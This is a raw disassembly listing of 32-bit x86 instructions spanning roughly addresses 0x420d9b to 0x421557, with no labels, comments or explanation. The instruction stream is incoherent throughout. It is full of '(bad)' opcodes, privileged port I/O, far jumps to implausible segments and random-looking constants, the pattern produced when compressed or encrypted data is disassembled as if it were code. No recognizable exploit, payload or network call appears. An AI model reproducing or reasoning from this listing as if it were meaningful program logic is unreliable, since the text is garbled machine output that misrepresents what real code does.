  420d9b:	call   FWORD PTR [ebx-0x2d]
  420d9e:	mov    ch,0x55
  420da0:	pop    ebx
  420da1:	xchg   edx,eax
  420da2:	int3   
  420da3:	stc    
  420da4:	outs   dx,BYTE PTR ds:[esi]
  420da5:	mov    ch,0x21
  420da7:	jge    0x420d96
  420da9:	mov    ds:0xdb4f9d8f,eax
  420dae:	push   cs
  420daf:	jmp    0x124a26e9
  420db4:	dec    edi
  420db5:	das    
  420db6:	in     eax,0x1f
  420db8:	ins    BYTE PTR es:[edi],dx
  420db9:	pop    ds
  420dba:	(bad)  
  420dbb:	out    dx,al
  420dbc:	rcr    BYTE PTR [esi],0xda
  420dbf:	add    eax,0x207cc198
  420dc4:	sbb    al,0x11
  420dc6:	out    0xd3,eax
  420dc8:	fiadd  WORD PTR [ecx+0x41f18461]
  420dce:	jecxz  0x420d5e
  420dd0:	cmp    dl,cl
  420dd2:	sbb    ecx,0x53a72313
  420dd8:	je     0x420da2
  420dda:	lods   al,BYTE PTR ds:[esi]
  420ddb:	hlt    
  420ddc:	jmp    0x9b5:0x2a9761a6
  420de3:	mov    dl,0x54
  420de5:	adc    ecx,ebx
  420de7:	(bad)  
  420de8:	xchg   esp,eax
  420de9:	pop    edx
  420dea:	out    dx,al
  420deb:	pop    edx
  420dec:	add    DWORD PTR [edi+0x66],esp
  420def:	fisubr WORD PTR [esp+edx*8+0x7609f3e1]
  420df6:	out    dx,al
  420df7:	into   
  420df8:	mov    ecx,0xd23fe96b
  420dfd:	jae    0x420e21
  420dff:	in     al,dx
  420e00:	call   DWORD PTR [ebp+0x7d135221]
  420e06:	stc    
  420e07:	nop/reserved BYTE PTR [edx-0x2bcb2c94]
  420e0e:	mov    ss,edi
  420e10:	dec    ebx
  420e11:	in     eax,0xa3
  420e13:	xchg   esi,eax
  420e14:	inc    edi
  420e15:	sahf   
  420e16:	sbb    eax,DWORD PTR [edx-0x439e9959]
  420e1c:	dec    ebx
  420e1d:	aad    0xd
  420e1f:	mov    cl,0x56
  420e21:	xchg   ebx,eax
  420e22:	or     al,0x6e
  420e24:	push   ebx
  420e25:	gs jns 0x420e63
  420e28:	mov    ecx,0x607b96fa
  420e2d:	and    BYTE PTR [eax+0x73],cl
  420e30:	mov    dh,0x34
  420e32:	out    0x7c,al
  420e34:	mov    ch,0x1f
  420e36:	xchg   edi,eax
  420e37:	pop    ss
  420e38:	ja     0x420e56
  420e3a:	aas    
  420e3b:	(bad)  
  420e3c:	fadd   DWORD PTR [ecx+0x66]
  420e3f:	retf   0x4be7
  420e42:	imul   edi,DWORD PTR [edi-0x53],0xff2680b1
  420e49:	jnp    0x420e84
  420e4b:	sti    
  420e4c:	sbb    eax,0xeec4ef85
  420e51:	frstor [edi]
  420e53:	mov    ds:0x3be3ab07,al
  420e58:	lds    ebx,FWORD PTR [ebx-0x2d595662]
  420e5e:	sar    DWORD PTR [eax],cl
  420e60:	xchg   edi,eax
  420e61:	xchg   ebx,eax
  420e62:	cmp    al,0x1c
  420e64:	or     DWORD PTR [ecx+0x68a8d65c],ecx
  420e6a:	mov    cl,0x5
  420e6c:	rol    BYTE PTR [edi+0x5d80596c],cl
  420e72:	imul   ecx,DWORD PTR [eax+0xb1e515a],0xffffffec
  420e79:	cld    
  420e7a:	inc    ebp
  420e7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e7c:	adc    DWORD PTR [edi-0x3aa3266d],ecx
  420e82:	push   edx
  420e83:	ret    
  420e84:	test   BYTE PTR [edi+0x7d],al
  420e87:	xor    ecx,DWORD PTR [ebx+esi*8-0x70]
  420e8b:	js     0x420ede
  420e8d:	adc    BYTE PTR [ecx],dl
  420e8f:	call   FWORD PTR [esi]
  420e91:	inc    eax
  420e92:	repz scas eax,DWORD PTR es:[edi]
  420e94:	xlat   BYTE PTR ds:[ebx]
  420e95:	and    BYTE PTR [eax],ah
  420e97:	retf   0x2e0
  420e9a:	clc    
  420e9b:	sbb    eax,0xce1d28d0
  420ea0:	mov    al,ds:0x7621427
  420ea5:	in     al,0x77
  420ea7:	cdq    
  420ea8:	dec    ebp
  420ea9:	leave  
  420eaa:	daa    
  420eab:	mov    dl,0xac
  420ead:	lock xchg edi,eax
  420eaf:	jae    0x420e45
  420eb1:	rol    DWORD PTR [ecx+0x5bda44ad],0x1f
  420eb8:	dec    ebx
  420eb9:	sub    al,0x2e
  420ebb:	imul   ebp,DWORD PTR [edi+0x492765f3],0xffffffbb
  420ec2:	mov    ebx,DWORD PTR [ebp-0x3e]
  420ec5:	inc    esi
  420ec6:	pop    ss
  420ec7:	enter  0x6bc9,0xc1
  420ecb:	into   
  420ecc:	or     eax,DWORD PTR [edx+0x2cdece1b]
  420ed2:	ret    
  420ed3:	fist   DWORD PTR [edx-0x2e]
  420ed6:	sbb    eax,DWORD PTR [ebx]
  420ed8:	(bad)  
  420ed9:	push   eax
  420eda:	loope  0x420eae
  420edc:	xchg   ebp,eax
  420edd:	mov    ah,0x51
  420edf:	inc    edi
  420ee0:	cli    
  420ee1:	jle    0x420f41
  420ee3:	in     eax,0x13
  420ee5:	out    dx,al
  420ee6:	(bad)  {k7}
  420eeb:	retf   0xf2de
  420eee:	shr    DWORD PTR [eax-0x77],cl
  420ef1:	xor    BYTE PTR [esi],0xa
  420ef4:	ja     0x420f56
  420ef6:	aaa    
  420ef7:	je     0x420eb2
  420ef9:	cs pop ebx
  420efb:	cmp    al,0x98
  420efd:	lea    esi,[esi]
  420eff:	retf   
  420f00:	push   ebp
  420f01:	jmp    0xe916:0xbdf6cb0e
  420f08:	fld    DWORD PTR [edx+0x27605042]
  420f0e:	pushf  
  420f0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f10:	mov    esp,0xe4017244
  420f15:	ins    BYTE PTR es:[edi],dx
  420f16:	xor    al,0xb9
  420f18:	xor    BYTE PTR [esi],bl
  420f1a:	mul    DWORD PTR [esi+0xda2cce4]
  420f20:	(bad)  
  420f21:	cmc    
  420f22:	out    0xff,eax
  420f24:	or     edx,ebx
  420f26:	inc    edx
  420f27:	xchg   esp,eax
  420f28:	cwde   
  420f29:	pop    esi
  420f2a:	std    
  420f2b:	hlt    
  420f2c:	mov    bl,0x34
  420f2e:	or     WORD PTR [ecx],di
  420f31:	outs   dx,BYTE PTR ds:[esi]
  420f32:	mov    ch,bh
  420f34:	cld    
  420f35:	adc    edx,ebp
  420f37:	popa   
  420f38:	popa   
  420f39:	shl    ebp,0x97
  420f3c:	jg     0x420f21
  420f3e:	les    edi,FWORD PTR [esi-0x7ccdeaf5]
  420f44:	adc    al,0xf
  420f46:	out    dx,eax
  420f47:	xlat   BYTE PTR ds:[ebx]
  420f48:	mov    eax,0xf5725b35
  420f4d:	fstp   st(7)
  420f4f:	mov    bh,0xb4
  420f51:	mov    ebx,0x2cc3ee9a
  420f56:	test   eax,esi
  420f58:	xor    esp,edi
  420f5a:	sbb    al,0xbe
  420f5c:	ret    
  420f5d:	push   0xcdd89862
  420f62:	or     BYTE PTR [edx],ah
  420f64:	dec    DWORD PTR [esi-0x2525c212]
  420f6a:	mov    ebx,0xac2d599
  420f6f:	in     al,dx
  420f70:	adc    al,0xe7
  420f72:	loop   0x420fb7
  420f74:	outs   dx,BYTE PTR ds:[esi]
  420f75:	mov    ah,0x11
  420f77:	or     DWORD PTR [eax+edi*1],esi
  420f7a:	ja     0x420f79
  420f7c:	and    al,0xa1
  420f7e:	imul   edi,DWORD PTR [eax+0x6a],0x46fd0672
  420f85:	lea    edi,[edx-0x56]
  420f88:	jnp    0x420f41
  420f8a:	or     dl,BYTE PTR [edx-0x34]
  420f8d:	adc    eax,0x6b8e4793
  420f92:	mov    ds:0x58ea9ef2,eax
  420f97:	push   ss
  420f98:	pusha  
  420f99:	shl    DWORD PTR [ecx+0x7c],1
  420f9c:	push   ss
  420f9d:	out    0x1,al
  420f9f:	addr16 adc bh,ch
  420fa2:	lea    esp,[edi+0xc2454ae]
  420fa8:	ficom  WORD PTR [ecx+0x2f2e1ea9]
  420fae:	sbb    cl,BYTE PTR [esi+0x4180c7bc]
  420fb4:	inc    ebx
  420fb5:	(bad)  
  420fb6:	mov    bl,BYTE PTR cs:[ecx-0x5bb64a3f]
  420fbd:	(bad)
  420fc0:	stos   DWORD PTR es:[edi],eax
  420fc1:	popa   
  420fc2:	fsubr  DWORD PTR [ebp-0x38]
  420fc5:	cmp    dl,cl
  420fc7:	xor    eax,0xef7c4e3e
  420fcc:	push   0xffffffb5
  420fce:	stc    
  420fcf:	mov    ebp,0xd0a00c45
  420fd4:	lods   al,BYTE PTR ds:[esi]
  420fd5:	push   ebp
  420fd6:	into   
  420fd7:	sub    BYTE PTR [eax+0x20],bh
  420fda:	stc    
  420fdb:	mov    dl,0xcd
  420fdd:	xchg   dh,bh
  420fdf:	pop    esi
  420fe0:	mov    bl,0x48
  420fe2:	inc    ebx
  420fe3:	mov    dl,0x55
  420fe5:	jae    0x42103e
  420fe7:	out    dx,eax
  420fe8:	enter  0x46f6,0x1f
  420fec:	mov    edi,edx
  420fee:	(bad)  
  420ff0:	xlat   BYTE PTR ds:[ebx]
  420ff1:	dec    ebp
  420ff2:	sub    DWORD PTR ds:0x982d3063,esp
  420ff8:	test   DWORD PTR [ebx-0x61],ecx
  420ffb:	push   ss
  420ffc:	dec    edx
  420ffd:	retf   0xdf82
  421000:	cld    
  421001:	iret   
  421002:	and    dh,cl
  421004:	aam    0xf4
  421006:	aaa    
  421007:	mov    ebx,0x54f6bcbb
  42100c:	and    bl,cl
  42100e:	(bad)  
  42100f:	fcomip st,st(6)
  421011:	fcom   QWORD PTR [ebx+0x1ef08206]
  421017:	mul    DWORD PTR [ebx+edx*2-0x2af153c9]
  42101e:	lds    ecx,FWORD PTR [ebp+0x793dcd65]
  421024:	cmp    eax,0xc28a8c8c
  421029:	sbb    BYTE PTR [ebx-0x76de7f3e],0xef
  421030:	(bad)  
  421031:	pop    ebp
  421032:	dec    edi
  421033:	or     eax,0x85e88fea
  421038:	mov    DWORD PTR [ebp+0x42],esp
  42103b:	add    al,0xbc
  42103d:	cmp    edi,DWORD PTR [ebp+edx*4+0x6ea89940]
  421044:	xor    edx,0xc42e269
  42104a:	bound  ebx,QWORD PTR [esi+0x6e]
  42104d:	push   edi
  42104e:	cld    
  42104f:	sbb    BYTE PTR [esi],ah
  421051:	push   edi
  421052:	rsqrtps xmm6,XMMWORD PTR [edx-0xa46d3ca]
  421059:	dec    ecx
  42105a:	or     ah,cl
  42105c:	popa   
  42105d:	mov    bh,0xa
  42105f:	pushf  
  421060:	ret    0x5db5
  421063:	loope  0x421016
  421065:	addr16 jl 0x4210df
  421068:	sbb    ch,BYTE PTR [ecx+0x59914c38]
  42106e:	lds    ebp,FWORD PTR [ecx-0x6]
  421071:	aam    0xa
  421073:	sar    DWORD PTR [eax-0x1abdbc61],cl
  421079:	cdq    
  42107a:	sub    dh,al
  42107c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42107d:	and    edx,DWORD PTR [edx]
  42107f:	out    0x62,eax
  421081:	push   edi
  421082:	cmp    al,ah
  421084:	jae    0x421025
  421086:	ds adc bl,dl
  421089:	mov    ss,edi
  42108b:	stos   BYTE PTR es:[edi],al
  42108c:	(bad)  
  42108e:	cmp    ah,bh
  421090:	adc    bl,BYTE PTR ds:0xb726174d
  421096:	lds    esp,FWORD PTR [edi-0x16c20491]
  42109c:	add    BYTE PTR [edi-0x24d3492e],bh
  4210a2:	jmp    0xc41cd70b
  4210a7:	bound  ebp,QWORD PTR [ecx+0x8]
  4210aa:	or     eax,0xf641c4fc
  4210af:	in     al,0x42
  4210b1:	xor    cl,BYTE PTR [edx+0x25]
  4210b4:	sbb    edi,DWORD PTR [ebx+0x3bea6df0]
  4210ba:	stos   BYTE PTR es:[edi],al
  4210bb:	pop    edi
  4210bc:	xchg   esp,eax
  4210bd:	das    
  4210be:	push   ecx
  4210bf:	das    
  4210c0:	xor    esp,DWORD PTR [ebx-0x2f]
  4210c3:	jge    0x42104c
  4210c5:	inc    eax
  4210c6:	(bad)  
  4210c7:	std    
  4210c8:	xchg   esp,eax
  4210c9:	dec    ebp
  4210ca:	inc    ebp
  4210cb:	in     al,0x44
  4210cd:	sbb    ebp,ecx
  4210cf:	sbb    ebp,DWORD PTR [ebx]
  4210d1:	test   eax,edi
  4210d3:	fcomp  QWORD PTR [ebx]
  4210d5:	jmp    0xed87:0xf9b27eb9
  4210dc:	test   BYTE PTR [ebx-0x7ac70463],bh
  4210e2:	dec    eax
  4210e3:	sub    ecx,DWORD PTR [ecx-0x178fbd92]
  4210e9:	je     0x421134
  4210eb:	nop
  4210ec:	stos   DWORD PTR es:[edi],eax
  4210ed:	and    al,0x72
  4210ef:	sub    al,0xeb
  4210f1:	mov    DWORD PTR [edx+0x581ba447],edi
  4210f7:	sub    eax,0x408e4268
  4210fc:	repz mov ch,0xd0
  4210ff:	pop    ebx
  421100:	xchg   ebp,eax
  421101:	push   edx
  421102:	outs   dx,DWORD PTR ds:[esi]
  421103:	push   ebx
  421104:	outs   dx,BYTE PTR ds:[esi]
  421105:	push   ebx
  421106:	or     eax,0xca822f74
  42110b:	push   esp
  42110c:	mov    ah,BYTE PTR [edi-0xd]
  42110f:	int3   
  421110:	nop
  421111:	bound  edi,QWORD PTR [edx+0x40ab2529]
  421117:	mov    ds:0x7d6a3e06,al
  42111c:	and    eax,0x3c5b8f77
  421121:	inc    edx
  421122:	pusha  
  421123:	test   BYTE PTR [eax],dh
  421125:	xchg   edx,eax
  421126:	(bad)  
  421128:	sub    edi,DWORD PTR [esi+eiz*1]
  42112b:	mov    cl,0x44
  42112d:	and    BYTE PTR [ebx+0x48219c75],bh
  421133:	aas    
  421134:	dec    ebp
  421135:	stos   BYTE PTR es:[edi],al
  421136:	xchg   ebx,eax
  421137:	clc    
  421138:	xchg   esp,eax
  421139:	icebp  
  42113a:	hlt    
  42113b:	jb     0x42119e
  42113d:	imul   eax,ebp,0xffffff85
  421140:	test   al,0x6e
  421143:	in     al,dx
  421144:	das    
  421145:	enter  0x4390,0x39
  421149:	fdivrp st(4),st
  42114b:	sbb    eax,0xd8c0b6cb
  421150:	add    eax,0xbf760db3
  421155:	inc    eax
  421156:	js     0x4211d5
  421158:	push   esp
  421159:	dec    esi
  42115a:	int3   
  42115b:	out    dx,al
  42115c:	mov    BYTE PTR [eax],bl
  42115e:	lds    esi,FWORD PTR [ebx-0x6e54e829]
  421164:	jo     0x421162
  421166:	mov    bl,BYTE PTR [ecx]
  421168:	mov    cl,0x9d
  42116a:	pop    ebx
  42116b:	cld    
  42116c:	and    dh,dh
  42116e:	mov    edi,0xa76eed79
  421173:	sub    BYTE PTR ss:[ecx-0x375bb146],ch
  42117a:	mov    ebx,0xc0ac9fe
  42117f:	add    BYTE PTR [ebx-0x52fd3955],cl
  421185:	or     ch,0xbb
  421188:	mov    cl,0x3
  42118a:	xor    eax,0xc42b447f
  42118f:	inc    esi
  421190:	cld    
  421191:	push   esi
  421192:	inc    edi
  421193:	pop    ecx
  421194:	xor    edx,edi
  421196:	mov    ebp,0x67a972fc
  42119b:	sub    al,0x6c
  42119d:	imul   ebx,esi,0x64
  4211a0:	jnp    0x4211e5
  4211a2:	and    edi,ecx
  4211a4:	lahf   
  4211a5:	xlat   BYTE PTR ds:[ebx]
  4211a6:	(bad)  [esi-0x38]
  4211a9:	xor    eax,0x64137e36
  4211ae:	cld    
  4211af:	push   ebx
  4211b0:	push   es
  4211b1:	std    
  4211b2:	sbb    al,0x6e
  4211b4:	test   al,0x7f
  4211b6:	xor    DWORD PTR [edi-0x58],0xffffffab
  4211ba:	repnz sbb eax,DWORD PTR [ebp+edx*4+0xa]
  4211bf:	mov    dl,0x42
  4211c1:	pop    ebp
  4211c2:	pop    esi
  4211c3:	out    0xcb,eax
  4211c5:	pop    esi
  4211c6:	inc    esp
  4211c7:	in     eax,dx
  4211c8:	push   esi
  4211c9:	imul   ecx,DWORD PTR [ebx-0x4859d39e],0x5d
  4211d0:	retf   0xd674
  4211d3:	in     eax,0xb6
  4211d5:	aam    0xcd
  4211d7:	mov    ?,ebp
  4211d9:	(bad)  
  4211da:	sahf   
  4211db:	cli    
  4211dc:	sbb    esi,DWORD PTR [eax+0x59]
  4211df:	mov    eax,ds:0xe23815d1
  4211e4:	js     0x4211f9
  4211e6:	adc    BYTE PTR [edi-0x59],bh
  4211e9:	xor    eax,0xe9388357
  4211ee:	div    DWORD PTR [eax+0x11]
  4211f1:	jl     0x42120c
  4211f3:	fcmovnb st,st(5)
  4211f5:	popf   
  4211f6:	jecxz  0x421245
  4211f8:	nop
  4211f9:	pop    ds
  4211fa:	rol    DWORD PTR [edx],cl
  4211fc:	test   DWORD PTR [ebp-0x68],edx
  4211ff:	jns    0x42123f
  421201:	mov    WORD PTR [ecx-0x354cd7f],fs
  421207:	mov    BYTE PTR [ebx],cl
  421209:	or     eax,0xecd7abfb
  42120f:	or     al,0x10
  421211:	dec    eax
  421212:	mov    ah,0x42
  421214:	cmp    al,0x94
  421216:	push   edi
  421217:	and    ebp,DWORD PTR [edi]
  421219:	enter  0x9d32,0xb3
  42121d:	push   cs
  42121e:	arpl   WORD PTR [ebp+0x7c18512c],si
  421224:	push   ecx
  421225:	out    0x49,eax
  421227:	test   DWORD PTR [edx+0x74],edx
  42122a:	push   ds
  42122b:	stos   DWORD PTR es:[edi],eax
  42122c:	cmp    eax,0x99317c7b
  421231:	xchg   ah,bl
  421233:	mov    bl,0x1d
  421235:	xchg   esi,eax
  421236:	dec    edx
  421237:	xchg   ah,bh
  421239:	das    
  42123a:	jg     0x421211
  42123c:	push   ebx
  42123d:	inc    ebx
  42123e:	xchg   edx,eax
  42123f:	push   eax
  421240:	cmp    al,0x8
  421242:	imul   esi,DWORD PTR [ebx-0x2976e7bc],0x19ea5aa4
  42124c:	mov    ch,0x24
  42124e:	or     eax,0xc85d7b6a
  421253:	push   0xfffffffc
  421255:	aaa    
  421256:	xchg   ebp,eax
  421257:	scas   eax,DWORD PTR es:[edi]
  421258:	(bad)  
  421259:	and    eax,0xb73b9b9a
  42125e:	scas   al,BYTE PTR es:[edi]
  42125f:	inc    esp
  421260:	mov    DWORD PTR [esi],edx
  421262:	cmp    al,0xee
  421264:	sub    ebp,DWORD PTR [esi-0x75]
  421267:	cmp    al,BYTE PTR [eax+eax*4-0x56de6453]
  42126e:	pop    edi
  42126f:	or     eax,DWORD PTR [edi+edi*2]
  421272:	jle    0x421239
  421274:	and    ah,dl
  421276:	sbb    eax,0xc86c2e98
  42127b:	mov    al,0xe6
  42127d:	cld    
  42127e:	scas   eax,DWORD PTR es:[edi]
  42127f:	shl    BYTE PTR [ebp-0x7],0x74
  421283:	in     eax,0x46
  421285:	pusha  
  421286:	imul   ebp,DWORD PTR [eax],0xffffffb5
  421289:	xchg   ebx,eax
  42128a:	popa   
  42128b:	xchg   edx,eax
  42128c:	repnz add al,0x41
  42128f:	fmul   DWORD PTR [edx-0x62e27144]
  421295:	sub    BYTE PTR [edx-0x2e],0xd3
  421299:	(bad)  
  42129a:	sbb    al,0x9e
  42129c:	enter  0x2318,0xe7
  4212a0:	loop   0x42126e
  4212a2:	imul   edi,DWORD PTR [edi+0x13],0xffffff99
  4212a6:	inc    ebp
  4212a7:	and    al,0xfb
  4212a9:	js     0x4212cc
  4212ab:	inc    ecx
  4212ac:	jbe    0x421268
  4212ae:	fs je  0x421313
  4212b1:	fdivr  QWORD PTR [ebx+0x2fab5fbc]
  4212b7:	(bad)  
  4212b8:	jmp    0x42128d
  4212ba:	fmulp  st(0),st
  4212bc:	addr16 mov bh,0xd7
  4212bf:	in     al,dx
  4212c0:	std    
  4212c1:	pop    ds
  4212c2:	or     DWORD PTR [ebp+0x3db2e8b],0x11b3dc13
  4212cc:	inc    ecx
  4212cd:	sahf   
  4212ce:	out    dx,al
  4212cf:	int    0x4a
  4212d1:	xlat   BYTE PTR ds:[ebx]
  4212d2:	ret    
  4212d3:	fstp   QWORD PTR [ecx-0x6e07239b]
  4212d9:	jno    0x4212b3
  4212db:	push   0x2b
  4212dd:	add    BYTE PTR [ebp+0x3c],0x96
  4212e1:	icebp  
  4212e2:	ins    DWORD PTR es:[edi],dx
  4212e3:	jmp    0xd451bb96
  4212e8:	shr    DWORD PTR [edx-0x48],cl
  4212eb:	xor    ch,BYTE PTR [ebx+ebp*8-0x3]
  4212ef:	clc    
  4212f0:	pop    ss
  4212f1:	inc    ebp
  4212f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212f3:	xor    BYTE PTR [ecx-0x4337eb6b],ch
  4212f9:	sub    eax,0xbf0f5ab9
  4212fe:	lock adc ah,BYTE PTR [ebp+0x211aea97]
  421305:	in     al,0x63
  421307:	(bad)  
  421308:	repnz aaa 
  42130a:	dec    esp
  42130b:	and    bl,dh
  42130d:	or     al,0x48
  42130f:	dec    ebp
  421310:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421311:	mov    ah,0x51
  421313:	int3   
  421314:	push   esi
  421315:	nop
  421316:	stos   DWORD PTR es:[edi],eax
  421317:	loope  0x4212d0
  421319:	adc    eax,0xe2c85c8
  42131e:	les    esp,FWORD PTR ds:0xb5fe6164
  421324:	ins    BYTE PTR es:[edi],dx
  421325:	je     0x42139c
  421327:	sahf   
  421328:	mov    dh,0x95
  42132a:	ins    BYTE PTR es:[edi],dx
  42132b:	rol    DWORD PTR [ebx],cl
  42132d:	or     bl,BYTE PTR [eax]
  42132f:	outs   dx,DWORD PTR ds:[esi]
  421330:	ins    DWORD PTR es:[edi],dx
  421331:	scas   al,BYTE PTR es:[edi]
  421332:	outs   dx,DWORD PTR ds:[esi]
  421333:	mov    ecx,0xe28ff464
  421338:	loop   0x4213b8
  42133a:	push   eax
  42133b:	sub    eax,DWORD PTR [esp+eax*8+0x2b67dab4]
  421342:	(bad)  
  421344:	adc    BYTE PTR [eax],0xde
  421347:	inc    BYTE PTR [ecx-0x64]
  42134a:	pop    edx
  42134b:	mov    esp,0x7fffd96c
  421350:	in     al,dx
  421351:	pop    esp
  421352:	cmp    eax,ebp
  421354:	pop    ebp
  421355:	stos   DWORD PTR es:[edi],eax
  421356:	das    
  421357:	stc    
  421358:	ja     0x4212fd
  42135a:	cmc    
  42135b:	push   edi
  42135c:	sub    eax,0x35d0849c
  421361:	retf   
  421362:	test   edi,0x5522f167
  421368:	rcl    ebx,0x5c
  42136b:	and    ah,BYTE PTR [ebp+0x2dd22bb1]
  421371:	fisttp WORD PTR [edx-0x7cba1483]
  421377:	jbe    0x4213f8
  421379:	pop    ecx
  42137a:	xor    ecx,edi
  42137c:	fstp   QWORD PTR [eax]
  42137e:	xlat   BYTE PTR ds:[ebx]
  42137f:	fcom   DWORD PTR [ebp+ebx*1-0x13cc7fd1]
  421386:	rcl    BYTE PTR [esi],cl
  421388:	lods   eax,DWORD PTR ds:[esi]
  421389:	push   0x351f4869
  42138e:	aas    
  42138f:	popf   
  421390:	into   
  421391:	or     al,0x4f
  421393:	mov    ds:0x8e2e15c2,al
  421398:	ret    0xd6ed
  42139b:	adc    eax,0xc2a9029f
  4213a0:	lock iret 
  4213a2:	xchg   edi,eax
  4213a3:	shl    DWORD PTR [eax+0xac632ff],0x17
  4213aa:	xor    DWORD PTR [edi],ebp
  4213ac:	xchg   ebp,eax
  4213ad:	test   DWORD PTR [edx],ecx
  4213af:	add    eax,DWORD PTR [ebp+0x2de3dbae]
  4213b5:	std    
  4213b6:	jg     0x421376
  4213b8:	data16 sub ch,0x2e
  4213bc:	stc    
  4213bd:	dec    eax
  4213be:	inc    DWORD PTR [ebx+0x2]
  4213c1:	pop    ebp
  4213c2:	(bad)  
  4213c3:	mov    ebp,0x98a68ed1
  4213c8:	inc    edx
  4213c9:	popa   
  4213ca:	loop   0x421436
  4213cc:	outs   dx,DWORD PTR ds:[esi]
  4213cd:	addr16 jle 0x4213de
  4213d0:	retf   
  4213d1:	adc    DWORD PTR [esi-0x36fc4e9e],0x349df886
  4213db:	in     al,0xa6
  4213dd:	mov    dl,0x74
  4213df:	xchg   ecx,eax
  4213e0:	inc    ecx
  4213e1:	sub    esp,DWORD PTR [eax+eiz*1+0xd485ee8]
  4213e8:	test   eax,0xfacab1ca
  4213ed:	push   ss
  4213ee:	xor    dh,BYTE PTR [eax+0x54]
  4213f1:	sub    BYTE PTR [ecx+0x160d8f06],0x9c
  4213f8:	out    0x23,eax
  4213fa:	imul   edx,ecx,0xffffffb3
  4213fd:	in     eax,dx
  4213fe:	jno    0x421470
  421400:	sub    ch,dl
  421402:	mov    eax,0xe16c577f
  421407:	repnz in eax,dx
  421409:	fst    DWORD PTR [eax+0x48]
  42140c:	les    edx,FWORD PTR [edi+0x5f04c390]
  421412:	jae    0x421410
  421414:	pop    ebp
  421415:	push   ecx
  421416:	jmp    0x7180:0x34f3fd5a
  42141d:	int    0x71
  42141f:	or     cl,dl
  421421:	mov    cl,0x9a
  421423:	xor    BYTE PTR [ebp-0x7d],dl
  421426:	(bad)  
  421427:	std    
  421428:	add    DWORD PTR [eax],eax
  42142a:	(bad)  
  42142b:	cmp    al,0x1
  42142d:	clc    
  42142e:	xor    eax,0x48c2c990
  421433:	dec    ebx
  421434:	sub    BYTE PTR [ebp+0x33],dh
  421437:	sbb    edx,DWORD PTR [edx+0x2b]
  42143a:	xor    ch,0x13
  42143d:	fisttp WORD PTR [ebp+0x51]
  421440:	rcl    al,0x49
  421443:	dec    edx
  421444:	xchg   DWORD PTR [edi+0x410c39d0],esi
  42144a:	cmp    eax,0x11e72b53
  42144f:	push   edx
  421450:	sbb    edi,DWORD PTR [eax-0x52698073]
  421456:	mov    ecx,0x8a875bd8
  42145b:	rol    DWORD PTR [ebp+ebp*1+0x373d4f8f],0xbf
  421463:	cmp    al,0xfc
  421465:	sbb    BYTE PTR [ebp+0x54],0xe3
  421469:	pop    ss
  42146a:	lahf   
  42146b:	mov    ds:0x3aa76fe7,eax
  421470:	int3   
  421471:	addr16 in eax,dx
  421473:	inc    edx
  421474:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421475:	and    ah,BYTE PTR [ecx]
  421477:	sub    bh,BYTE PTR [eax]
  421479:	and    ecx,DWORD PTR ds:0x69de49c6
  42147f:	mov    ebx,0x9a6ed66d
  421484:	inc    ebp
  421485:	cwde   
  421486:	xor    DWORD PTR [esi],edx
  421488:	fisttp DWORD PTR [esi-0x3e0fc64b]
  42148e:	sbb    eax,0x89235760
  421493:	js     0x421464
  421495:	add    BYTE PTR [esi-0x5a],ah
  421498:	xor    ebp,edx
  42149a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42149b:	sub    al,0xf0
  42149d:	push   eax
  42149e:	inc    esi
  42149f:	sahf   
  4214a0:	cli    
  4214a1:	or     BYTE PTR [eax+0x3a6c65dc],dh
  4214a7:	adc    BYTE PTR [ebp-0x18],0xb2
  4214ab:	je     0x4214e3
  4214ad:	dec    edi
  4214ae:	xor    al,0x1c
  4214b0:	pop    esp
  4214b1:	add    ebx,ebp
  4214b3:	pusha  
  4214b4:	adc    al,0x36
  4214b6:	adc    eax,0x618a74ce
  4214bb:	add    DWORD PTR [eax-0x49],ecx
  4214be:	fstp   TBYTE PTR [ebx+esi*1+0x48cb6c3d]
  4214c5:	mov    ebp,0x5e32644c
  4214ca:	xor    edi,edx
  4214cc:	icebp  
  4214cd:	outs   dx,DWORD PTR ds:[esi]
  4214ce:	xchg   esi,eax
  4214cf:	jecxz  0x421510
  4214d1:	addr16 nop
  4214d3:	sar    DWORD PTR [edx+0x51594d1c],cl
  4214d9:	xchg   esi,eax
  4214da:	lock call ebx
  4214dd:	(bad)  
  4214de:	adc    ebp,DWORD PTR [eax]
  4214e0:	mov    esi,0x3435c709
  4214e5:	test   DWORD PTR [eax+eiz*2+0x67],ebx
  4214e9:	ins    DWORD PTR es:[edi],dx
  4214ea:	inc    ebx
  4214eb:	cmp    al,0x20
  4214ed:	push   ds
  4214ee:	stc    
  4214ef:	cs loop 0x421548
  4214f2:	ja     0x421547
  4214f4:	xchg   BYTE PTR [ebx+ebp*1],ah
  4214f7:	hlt    
  4214f8:	xchg   ebp,eax
  4214f9:	sub    ch,BYTE PTR [ecx]
  4214fb:	mov    dh,0xed
  4214fd:	push   ss
  4214fe:	das    
  4214ff:	int    0x28
  421501:	and    BYTE PTR [ecx+esi*8],bh
  421504:	xor    edx,DWORD PTR [ebx]
  421506:	test   eax,0x48ae3279
  42150b:	jl     0x421501
  42150d:	and    al,0x2b
  42150f:	fist   WORD PTR [ebx-0x41]
  421513:	jle    0x421510
  421515:	scas   al,BYTE PTR es:[edi]
  421516:	je     0x4214b0
  421518:	jg     0x421574
  42151a:	out    0x7f,eax
  42151c:	icebp  
  42151d:	cmp    ecx,DWORD PTR [ecx+0x50]
  421520:	xchg   BYTE PTR [esi],ah
  421522:	shl    BYTE PTR [edx-0x5a],0xd1
  421526:	repz and DWORD PTR [ebx-0x16],esi
  42152a:	mov    bh,BYTE PTR [edi+0x60]
  42152d:	sub    ecx,DWORD PTR [ecx+0x3c31161f]
  421533:	rol    DWORD PTR [ebx],cl
  421535:	add    al,0x7a
  421537:	and    DWORD PTR [edi],edi
  421539:	bound  ecx,QWORD PTR [eax+0x5a95a3b9]
  42153f:	xchg   esi,eax
  421540:	ja     0x4214ed
  421542:	jnp    0x42155d
  421544:	stos   DWORD PTR es:[edi],eax
  421545:	pop    ds
  421546:	jp     0x42155b
  421548:	imul   edi,ebp,0x334209a8
  42154e:	(bad)  
  42154f:	shl    BYTE PTR [eax],1
  421551:	aam    0x26
  421553:	inc    eax
  421554:	ret    0xc1bb
  421557:	xor    bh,ch
